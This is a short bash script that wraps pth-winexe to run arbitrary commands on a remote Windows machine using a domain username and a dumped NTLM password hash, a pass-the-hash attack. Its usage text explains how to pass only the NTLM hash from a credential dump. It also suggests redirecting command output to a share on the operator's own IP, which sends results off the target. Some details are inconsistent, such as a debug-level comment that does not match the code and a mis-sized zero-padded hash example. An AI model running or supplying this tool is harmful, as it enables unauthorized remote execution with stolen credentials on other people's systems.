#!/bin/bash

ShowUsage() {
	echo "Usage: $0 <target system> <username> <password hash> <command line>"
	echo "Username should be <DOMAIN>/<User>"
	echo "Can redirect with >> in command.  For example:"
	echo "dir >> \\[yourIP\YourShare\results.txt or dir >> c:\users\<username>\results.txt"
	echo "Note:  IF you only have the NTLM hash from a dump, you can still do this, just put 32 zeros as the LM hash like this:"
	echo "000000000000000000000000000000030:51d6cfe7d16ee931b73c59d7e0c088c1"
}

if [ $# -lt 4 ]; then
	ShowUsage
	exit 1
fi

TARGET=$1
USERNAME=$2
PASSWORD="$3"
QUERY="$4"

# -d 6 is a debug level setting so you can see what's going on
pth-winexe -d 1 -U $USERNAME%$PASSWORD //$TARGET "cmd /c $QUERY"

